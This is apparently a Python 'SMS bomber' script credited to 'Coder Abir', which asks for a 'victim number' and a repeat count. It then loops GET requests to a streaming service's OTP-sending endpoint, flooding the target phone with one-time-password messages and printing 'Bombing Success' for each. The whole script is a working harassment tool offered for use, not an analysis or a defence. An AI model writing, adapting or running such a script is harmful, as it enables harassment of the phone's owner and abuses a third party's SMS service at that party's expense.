import requests,sys,time
 
def axak(panda):
   for xak in panda+"\n":
    sys.stdout.write(xak)
    sys.stdout.flush()
    time.sleep(0.004)
   
axak("""\033[1;32m
                ___  __  _____ ___ 
              (  _  )(  _ \ \__   /(  __ )
              | (   ) || (   ) )   ) (   | (    )|
              | (___) || (__/ /    | |   | (____)|
            \033[1;31m  |  _  ||   (     | |   |     )
              | (   ) || (  \ \    | |   | (\ (   
              | )   ( || )_) )___) (___| ) \ \__
              |/     \||/ \___/ \_______/|/   \__/
                             
                       \033[1;37m   [Coder Abir]                
""")
number = str(input("\nENTER YOUR VICTIM NUMBER :>> "))
amount =int(input("\nENTER YOUR AMOUNT :>> "))
 
url = "https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
for i in range(amount):
 resp=requests.get(url)
 print(str(i+1)+"Bombing Success ")